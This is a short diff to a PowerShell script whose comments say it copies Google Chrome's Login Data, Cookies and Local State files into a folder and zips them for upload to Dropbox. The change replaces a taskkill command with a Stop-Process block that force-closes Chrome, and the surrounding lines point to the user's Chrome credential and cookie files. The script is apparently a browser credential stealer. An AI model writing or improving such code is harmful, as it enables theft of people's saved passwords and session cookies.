@@ -27,7 +27,18 @@
 # Google Chrome - copy Login Data, Cookies, and Local State files and add them to a new folder called Google-UserData
 # then zip that folder to be ready to send to dropbox
 
-taskkill /F /IM chrome.exe
+#------------------------------------------------------------------------------------------------------------------------------------
+
+# Terminate Google Chrome Process
+try {
+    Write-Host "Terminating Google Chrome process..."
+    Stop-Process -Name "chrome" -Force
+    Write-Host "Google Chrome process terminated successfully."
+}
+catch {
+    Write-Host "Error occurred while terminating Google Chrome process: $_" -ForegroundColor Red
+}
+#------------------------------------------------------------------------------------------------------------------------------------
 
 $GLoginPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 $GcookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
